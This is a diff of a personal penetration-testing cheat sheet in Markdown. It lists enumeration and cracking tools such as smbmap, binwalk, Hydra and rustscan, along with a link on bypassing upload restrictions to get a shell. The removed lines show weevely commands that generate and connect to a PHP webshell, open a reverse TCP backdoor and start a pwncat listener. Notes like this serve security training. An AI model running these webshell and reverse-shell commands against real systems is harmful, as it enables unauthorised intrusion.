@@ -15,7 +15,6 @@
 ## Reaped
 
 * `smbmap -H IP`: see shares, users, files
-* RPC 111
 * binwalk / binwalk -e (extract)
   * see what there is inside the file (ex: img then zip)
 * https://github.com/frizb/Hydra-Cheatsheet
@@ -23,11 +22,6 @@
 * https://github.com/carlospolop/legion
 * export TERM=xterm-256color
 * https://www.pentesterlab.com/
-* https://github.com/epinna/weevely3
-  * weevely generate password webshell.php
-  * weevely URL/webshell.php password
-  * :backdoor_reversetcp IP PORT
-  * pwncat -lvv PORT
 * https://github.com/nccgroup/GTFOBLookup
 * https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/
 * rustscan -a $IP -- --script=http-headers
